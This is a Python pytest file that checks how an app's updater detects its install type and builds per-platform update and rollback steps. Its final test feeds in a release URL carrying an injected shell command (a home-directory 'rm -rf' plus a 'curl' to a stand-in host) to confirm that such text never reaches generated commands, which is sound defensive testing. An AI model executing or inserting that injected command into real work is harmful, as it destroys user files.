"""Installation-type detection and installation-specific guidance."""

from __future__ import annotations

from pathlib import Path, PurePosixPath, PureWindowsPath

import pytest

from app.updates.install import (
    InstallInfo,
    InstallType,
    current_arch,
    current_os,
    detect_install_type,
    rollback_steps,
    update_steps,
)
from app.updates.version import Version

TARGET = Version.parse("0.2.0")
RELEASE_URL = "https://github.com/m-alagha/OpenFilm-Studio/releases/tag/v0.2.0"


def detect(tmp_path: Path, env: dict[str, str] | None = None, docker: bool = False) -> InstallType:
    dockerenv = tmp_path / ("dockerenv-present" if docker else "dockerenv-absent")
    if docker:
        dockerenv.write_text("")
    return detect_install_type(tmp_path / "app", env or {}, dockerenv=dockerenv)


def test_detection(tmp_path: Path) -> None:
    app = tmp_path / "app"
    app.mkdir()
    assert detect(tmp_path) is InstallType.SOURCE
    (app / "openfilm-install.json").write_text("{}")
    assert detect(tmp_path) is InstallType.PACKAGED
    (app / ".git").mkdir()
    assert detect(tmp_path) is InstallType.GIT
    assert detect(tmp_path, docker=True) is InstallType.DOCKER
    assert detect(tmp_path, {"OPENFILM_INSTALL_TYPE": "docker"}) is InstallType.DOCKER
    assert detect(tmp_path, {"OPENFILM_INSTALL_TYPE": "bogus"}) is InstallType.GIT


def test_this_checkout_is_detected_as_git() -> None:
    assert detect_install_type(Path(__file__).resolve().parents[2], {}) is InstallType.GIT


@pytest.mark.parametrize(
    ("platform", "name"), [("win32", "windows"), ("darwin", "macos"), ("linux", "linux")]
)
def test_os_and_arch(platform: str, name: str) -> None:
    assert current_os(platform) == name
    assert current_arch("AMD64") == "x64"
    assert current_arch("aarch64") == "arm64"


@pytest.mark.parametrize("install_type", list(InstallType))
@pytest.mark.parametrize("os_name", ["windows", "macos", "linux"])
def test_every_install_type_gets_guidance_and_no_one_click(
    install_type: InstallType, os_name: str
) -> None:
    info = InstallInfo(install_type, os_name, Path("/opt/openfilm"))
    steps = update_steps(info, TARGET, RELEASE_URL)
    assert steps and all(s.title for s in steps)
    assert info.one_click_supported is False  # unsupported until signed installers exist
    assert "signed" in info.one_click_reason
    assert rollback_steps(info, Version.parse("0.1.0"))


def test_git_steps_are_platform_specific() -> None:
    win = update_steps(
        InstallInfo(InstallType.GIT, "windows", PureWindowsPath(r"C:\apps\OpenFilm")),
        TARGET,
        RELEASE_URL,
    )
    nix = update_steps(
        InstallInfo(InstallType.GIT, "linux", PurePosixPath("/home/a b/OpenFilm")),
        TARGET,
        RELEASE_URL,
    )
    win_cmds = [s.command for s in win if s.command]
    nix_cmds = [s.command for s in nix if s.command]
    assert 'cd /d "C:\\apps\\OpenFilm"' in win_cmds and "scripts\\dev.cmd" in win_cmds
    assert "cd '/home/a b/OpenFilm'" in nix_cmds and "sh scripts/dev.sh" in nix_cmds
    assert "git checkout v0.2.0" in win_cmds and "git status --porcelain" in nix_cmds
    assert "git remote get-url origin" in nix_cmds


def test_release_metadata_never_reaches_commands() -> None:
    hostile_url = (
        "https://github.com/m-alagha/OpenFilm-Studio/releases/tag/v0.2.0; rm -rf ~ $(curl evil)"
    )
    for install_type in InstallType:
        for os_name in ("windows", "linux"):
            info = InstallInfo(install_type, os_name, Path("/opt/openfilm"))
            for step in update_steps(info, TARGET, hostile_url):
                assert step.command is None or "rm -rf" not in step.command
                assert step.command is None or "curl" not in step.command
